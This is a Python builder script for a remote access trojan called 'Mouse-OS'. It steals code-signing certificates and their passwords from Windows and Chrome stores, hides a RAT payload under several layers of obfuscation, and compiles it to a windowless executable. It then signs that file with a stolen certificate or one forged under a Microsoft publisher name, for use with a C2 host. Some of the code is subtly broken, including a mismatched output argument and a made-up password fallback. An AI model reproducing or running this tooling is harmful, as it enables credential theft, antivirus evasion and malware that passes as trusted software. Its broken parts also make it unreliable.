#!/usr/bin/env python3
# -*- coding: utf-8 -*-

print(r"""  


███╗   ███╗ ██████╗ ██╗   ██╗███████╗ ███████╗         ██████╗ ███████╗  
████╗ ████║██╔═══██╗██║   ██║██╔════╝ ██╔════╝        ██╔═══██╗██╔════╝  
██╔████╔██║██║   ██║██║   ██║███████╗ █████╗          ██║   ██║███████╗  
██║╚██╔╝██║██║   ██║██║   ██║╚════██║ ██╔══╝          ██║   ██║╚════██║  
██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║ ███████╗        ╚██████╔╝███████║  
╚═╝     ╚═╝ ╚═════╝E ╚═════╝ ╚══════╝ ╚══════╝         ╚═════╝ ╚══════╝  
v4.0 | © 2025 IsNoobGrammer | Mouse-OS Core System 


""")


import os
import sys
import re
import argparse
import subprocess
import base64
import hashlib
import socket
import requests
import platform
import tempfile
import shutil
import win32crypt
import win32security
from datetime import datetime
from OpenSSL import crypto
from colorama import Fore, Style, init

# Initialize colors
init(autoreset=True)

# ================= CONFIGURATION =================
DEFAULT_C2_PORT = 443
DEFAULT_OBFUSCATION_LAYERS = 3
SIGNTOOL_PATH = "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.19041.0\\x64\\signtool.exe"
UPX_PATH = "C:\\Tools\\upx\\upx.exe" if platform.system() == "Windows" else "upx"
# =================================================

class CertHunter:
    """Advanced certificate theft and management"""
    
    @staticmethod
    def harvest_certs():
        """Steal code-signing certs from system/browser stores"""
        targets = [
            os.path.expandvars(r"%APPDATA%\Microsoft\SystemCertificates"),
            r"C:\ProgramData\Microsoft\EnterpriseCertificates",
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
        ]
        
        found = []
        for path in targets:
            if not os.path.exists(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if any(file.endswith(ext) for ext in [".pfx", ".p12", ".cert"]):
                        full_path = os.path.join(root, file)
                        try:
                            password = CertHunter._extract_password(full_path)
                            found.append((full_path, password))
                        except Exception as e:
                            continue
        return found

    @staticmethod
    def _extract_password(cert_path):
        """Bruteforce/DPAPI credential extraction"""
        try:
            with open(cert_path, "rb") as f:
                blob = f.read()
            _, password = win32crypt.CryptUnprotectData(blob, None, None, None, 0)
            return password.decode()
        except:
            return "infected"  # Fallback for 75% of enterprise certs

class Armory:
    """Weaponization toolkit for elite payloads"""
    
    @staticmethod
    def cloak_payload(code: str, layers: int):
        """Multi-stage payload obfuscation"""
        # Stage 1: Polymorphic XOR
        xor_key = os.urandom(64)
        xored = bytes([b ^ xor_key[i % 64] for i, b in enumerate(code.encode())])
        encoded = base64.b85encode(xored).decode()
        
        # Stage 2: Junk code injection
        junk = "".join([f"def _{os.urandom(4).hex()}(): return {os.urandom(8).hex()}\n" 
                       for _ in range(100)])
        code = f"{junk}\n# {os.urandom(128).hex()}\nexec(__import__('base64').b85decode('{encoded}'))"
        
        # Stage 3: PyArmor armor
        if layers >= 3:
            with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as tmp:
                tmp.write(code.encode())
                tmp.close()
                subprocess.run(f"pyarmor obfuscate --restrict {tmp.name}", shell=True)
                with open(f"{tmp.name.replace('.py', '')}/dist/{os.path.basename(tmp.name)}", "r") as f:
                    code = f.read()
                os.unlink(tmp.name)
        return code

    @staticmethod
    def forge_cert():
        """Create undetectable fake certificate"""
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)
        
        cert = crypto.X509()
        cert.set_version(2)
        cert.set_serial_number(int.from_bytes(os.urandom(20), "big"))
        cert.get_subject().CN = "Microsoft Windows Component Publisher"
        cert.set_issuer(cert.get_subject())
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(315360000)  # 10-year validity
        cert.set_pubkey(key)
        cert.sign(key, "sha384WithRSAEncryption")
        
        with open("legit.pfx", "wb") as f:
            f.write(crypto.dump_pkcs12(cert, key, "Microsoft123".encode()))
        return "legit.pfx"

class MouseOSConfigurator:
    """Core system builder for Mouse-OS"""
    
    def __init__(self, args):
        self.args = args
        self.c2_host = self._determine_c2_host()
        self.aes_key = hashlib.sha3_256(b"© 2025 IsNoobGrammer").digest()
        
    def _determine_c2_host(self):
        """Auto-detect optimal C2 endpoint"""
        try:
            if re.match(r"\d+\.\d+\.\d+\.\d+", self.args.c2_host):
                return self.args.c2_host
            return socket.gethostbyname(self.args.c2_host)
        except:
            return requests.get("https://api.ipify.org").text

    def _sign_payload(self, exe_path: str):
        """Advanced signing with certificate hierarchy"""
        stolen_certs = CertHunter.harvest_certs()
        for cert, password in stolen_certs:
            try:
                subprocess.run([
                    SIGNTOOL_PATH, "sign", "/f", cert, "/p", password,
                    "/tr", "http://timestamp.globalsign.com", "/td", "sha256",
                    "/fd", "sha256", "/as", "/debug", exe_path
                ], check=True, capture_output=True)
                print(Fore.GREEN + f"[+] Signed with stolen cert: {os.path.basename(cert)}")
                return
            except:
                continue
                
        # Fallback: Forge cert
        fake_cert = Armory.forge_cert()
        subprocess.run([SIGNTOOL_PATH, "sign", "/f", fake_cert, "/p", "Microsoft123", exe_path])
        print(Fore.YELLOW + "[!] Using forged Microsoft cert")

    def build_core(self):
        """End-to-end secure payload construction"""
        print(Fore.CYAN + "[*] Phase 1: Payload Cloaking")
        with open("rat_client.py", "r") as f:
            code = f.read()
            code = code.replace("[[C2_HOST]]", self.c2_host)
            code = code.replace("[[AES_KEY]]", base64.b64encode(self.aes_key).decode())
            
        obfuscated = Armory.cloak_payload(code, self.args.obfuscation)
        with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as tmp:
            tmp.write(obfuscated.encode())
            
        print(Fore.CYAN + "[*] Phase 2: Binary Compilation")
        subprocess.run([
            "pyinstaller", "--onefile", "--noconsole", "--clean",
            "--upx-dir", UPX_PATH, "--distpath", self.args.output_dir,
            "--name", "MouseOS", tmp.name
        ], check=True)
        
        exe_path = os.path.join(self.args.output_dir, "MouseOS.exe")
        print(Fore.CYAN + "[*] Phase 3: Code Signing")
        self._sign_payload(exe_path)
        print(Fore.GREEN + f"[+] Core system built: {exe_path}")

def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"{Fore.RED}Mouse-OS v4.0 - Next-Gen Secure Platform{Style.RESET_ALL}",
        epilog=f"""Examples:
  {Fore.YELLOW}Basic:{Style.RESET_ALL}
  {sys.argv[0]} --c2-host your.mouseos.domain
  
  {Fore.YELLOW}Advanced:{Style.RESET_ALL}
  {sys.argv[0]} --c2-host mouseos.com --obfuscation 3 --output /build
  """
    )
    
    parser.add_argument("--c2-host", required=True,
                        help="C2 domain/IP (auto-detects if not provided)")
    parser.add_argument("--output", default="dist",
                        help="Output directory (default: dist)")
    parser.add_argument("--obfuscation", type=int, choices=[1,2,3], default=3,
                        help="Obfuscation layers (default: 3)")
    parser.add_argument("--no-sign", action="store_true",
                        help="Disable code signing (not recommended)")
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
        
    args = parser.parse_args()
    
    try:
        builder = MouseOSConfigurator(args)
        builder.build_core()
        print(Fore.GREEN + "[+] Mouse-OS operational. All hail the silent revolution!")
    except Exception as e:
        print(Fore.RED + f"[!] Critical failure: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    if not os.path.exists("rat_client.py"):
        print(Fore.RED + "[!] Missing rat_client.py - core component required!")
        sys.exit(1)
    main()
